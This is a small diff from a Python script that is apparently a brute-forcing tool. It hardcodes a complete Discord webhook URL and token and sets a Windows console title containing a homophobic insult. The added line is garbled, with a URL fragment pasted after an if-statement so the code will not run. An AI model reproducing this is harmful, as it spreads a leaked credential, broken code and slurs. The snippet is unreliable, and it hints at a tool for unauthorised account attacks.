@@ -9,7 +9,7 @@ import requests
 from datetime import datetime, timedelta
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1524012952104079410/RUtlr3L-M9nYfVg86H7ldyDffeqdveOMPFWxVgYH4oUqnMf5AXId2M9Fxm18ht7Mq3OR"
-if platform.system() == "Windows":
+if platform.system() == "Windows":iscord.com/api/webhooks/15240129521040794
     import winsound
     import ctypes
     ctypes.windll.kernel32.SetConsoleTitleW("etasteee bruteforcing in collab with Dexter Api (Run this tool if you fucking gay)")
